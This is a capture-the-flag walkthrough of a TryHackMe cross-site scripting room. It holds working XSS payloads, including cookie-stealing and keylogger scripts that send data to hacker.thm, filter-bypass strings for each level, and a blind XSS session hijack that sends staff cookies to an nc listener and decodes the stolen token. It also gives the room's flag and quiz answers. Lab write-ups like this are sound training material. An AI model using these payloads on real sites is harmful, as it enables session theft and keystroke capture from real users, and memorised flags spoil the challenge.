## Walkthrough of TryHackMe - Intro to Cross-site Scripting room 


### Example Payloads

#### Proof Of Concept:

`<script>alert('XSS');</script>`



#### Session Stealing:

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
#### Key Logger:

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```



#### Business Logic:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```
##
#### Q: Which document property could contain the user's session token?

#### A: document.cookie

#### Q: Which JavaScript method is often used as a Proof Of Concept?

#### A: alert

##

### Reflected XSS
* Inject a malicous code inside url parameters

Where is good to test for Reflected XSS?
* Parameters in the URL Query String
* URL File Path
* Sometimes HTTP Headers (although unlikely exploitable in practice)

#### Q: Where in an URL is a good place to test for reflected XSS?

#### A: parameters

## 

### Stored XSS
* Upload a malicous command into a comment section
* Then every user that loads the command section runs the malicous code

The malicous code can:
* redirect users to another site
* steal the user's session cookie
*  perform other website actions while acting as the visiting user

Test for stored XSS:
* You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to... --->

* Comments on a blog
* User profile information
* Website Listings


#### Q: How are stored XSS payloads usually stored on a website?

#### A: database

##

### DOM Based XSS
- DOM  --> Document Object Model
* Basicaly There are many inbuilt functions that takes arguments in the url and load them into the website, Without sending the data into the server(Backend of the website).
* For example `window.location.hash` ---> Takes whats after the # in the url. Attacker can exploit this function and inject Malicous code into the website.

`https://site.com/#hello`
* The value of `window.location.hash` == hello
* If the user will inject somthing like
`https://site.com/#script>alert(1)</script`
This is a DOM Based XSS

### Blind XSS
* Similar to Stored XSS, The diffrence is you cant see the payload working or be able to rest it against yourself first
* Example: 
    * Contact Form,Allow inserting malicous code
    * Data is sent to a private portal the attacker doesnt have access to

#### TO test for blind XSS use the tool ` XSS Hunter Express`


#### What tool can you use to test for Blind XSS?

#### A: XSS Hunter Express

#### Q: What type of XSS is very similar to Blind XSS?

#### A: Stored XSS

## Practice
### Level 1
`<script>alert('THM');</script>`
### Level 2
* Paste this as your name
* `"><script>alert('THM');</script>`

### Level 3
`a</textarea><script>alert('THM');</script>`
### Level 4
`';alert('THM');//`
### Level 5
`<sscriptcript>alert('THM');</sscriptcript>`
### Level 6
`x" onerror="alert('THM')" src="x`
Another option
* `x" onmouseover="alert('THM')"`
* `x" onload="alert('THM');`


### FLAG ---> `THM{XSS_MASTER}`


### Practical Example - Blind XSS
* Lets practice what we have learned agains a real CTF website

https://10-65-148-137.reverse-proxy.cell-prod-us-east-1b.vm.tryhackme.com/
1. Enter website -> Customer ->  Signup here 
2. Create a user account
3. In the "support tickets" section we can create a ticket that is beeing sent to the IT staff of the site
4. Lets test for blind ctf

#### POC
* lets try to print THM alert
* Create new ticket, in the title put 
`<script>alert('THM');</script>`
* Worked!!!! We see an THM alert

#### Session Hijacking using XSS
* Lets create a reverse shell to capture all the cookies from the website
    1. create a listener
    `nc -nlvp 9001` 
    2. Create new ticket with the title
    ```
    <script>fetch('http://192.168.171.238:9001?cookie=' + btoa(document.cookie) );</script>
    ```
    * Note to replace the IP with the ip of the attacker machine
    * replace the port number with the port you opened previously on the listener 
    * Send the ticket
    * Open the terminal with the nc listener
    * you should see this output

```
Listening on 0.0.0.0 9001
Connection received on 10.65.148.137 37100
GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
Host: 10.65.125.131:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 

```
Lets cycrypt the cookie encoded in base64
`c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==`

------>
```bash
echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d
#Output:
staff-session=4AB305E55955197693F01D6F8FD2D321
```
### Final question answer ----> `4AB305E55955197693F01D6F8FD2D321`

## You Completed the room!
